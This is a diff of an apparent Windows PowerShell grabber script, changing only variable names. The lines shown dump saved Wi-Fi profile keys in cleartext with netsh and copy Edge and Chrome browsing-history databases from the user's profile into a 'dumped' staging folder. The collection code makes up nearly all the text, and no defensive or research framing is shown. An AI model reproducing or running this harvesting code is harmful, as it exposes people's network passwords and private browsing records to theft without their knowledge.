@@ -18,9 +18,9 @@ Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
 
 try {
     #This command copies edge history data to dumped/edge
-    $origin_edge_path="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
-    $edgehistorycopypath="dumped\edge"
-    Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force -ErrorAction Stop 
+    $source_path_edge="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    $destination_path_edge="dumped\edge"
+    Copy-Item -Path $source_path_edge -Destination $destination_path_edge -Force -ErrorAction Stop 
 }
 catch {
     Write-Host "Edge Is not installed on this device, or the history folder is not available."
@@ -30,9 +30,9 @@ catch {
 
 try {
     #This command copies chrome history data to dumped/chrome.
-    $origin_chrome_path="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default\History"
-    $chromehistorycopypath="dumped\chrome"
-    Copy-Item -Path $origin_chrome_path -Destination $chromehistorycopypath -Force -ErrorAction Stop
+    $source_path_chrome="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default\History"
+    $destination_path_chrome="dumped\chrome"
+    Copy-Item -Path $source_path_chrome -Destination $destination_path_chrome -Force -ErrorAction Stop
 }
 catch {
     Write-Host "Google Chrome is not installed on this device, or the history folder is not available."
